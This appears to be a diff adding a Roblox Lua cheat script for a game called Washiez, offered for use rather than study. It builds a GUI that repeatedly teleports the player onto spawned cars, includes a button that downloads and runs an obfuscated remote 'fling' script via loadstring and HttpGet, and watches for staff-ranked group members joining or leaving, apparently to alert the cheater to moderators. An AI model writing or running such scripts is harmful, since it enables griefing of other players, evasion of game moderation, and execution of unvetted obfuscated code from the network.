@@ -1,0 +1,60 @@
+local groupId = 10261023
+local rankNames = {"Junior Director",
+    "Senior Director", "Head Director", "Corporate Intern", "Junior Corporate",
+    "Senior Corporate", "Head Corporate", "Chief Human Resources Officer",
+    "Chief Public Relations Officer", "Chief Operating Officer",
+    "Chief Administrative Officer", "Developer", "Vice Chairman", "Chairman"
+}
+
+local function sendNotification(player, title, action)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = title,
+        Text = player.Name .. " has " .. action .. " with the rank of " .. player:GetRoleInGroup(groupId),
+        Duration = 5
+    })
+end
+
+local function handlePlayerEvent(player, title, action)
+    local success, rank = pcall(function()
+        return player:GetRankInGroup(groupId)
+    end)
+
+    for _, rankName in ipairs(rankNames) do
+        if success and rankName == player:GetRoleInGroup(groupId) then
+            sendNotification(player, title, action)
+            break
+        end
+    end
+end
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Washiez fling all", "DarkTheme")
+local Tab = Window:NewTab("npc's GUI")
+local Section = Tab:NewSection("npc's GUI")
+
+Section:NewToggle("Toggle", "ToglInfo", function(state)
+    if state then
+        _G.on = true
+        while _G.on do
+            task.wait(0.1)
+            for i, v in pairs(workspace.SpawnedCars:GetChildren()) do
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.PrimaryPart.CFrame
+                wait(0.1)
+            end
+        end
+    else
+        _G.on = false
+    end
+end)
+
+Section:NewButton("Fling script (sexy)", "ButtonInfo", function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
+end)
+
+game.Players.PlayerAdded:Connect(function(player)
+    handlePlayerEvent(player, "Player joined", "joined")
+end)
+
+game.Players.PlayerRemoving:Connect(function(player)
+    handlePlayerEvent(player, "Player left", "left")
+end)
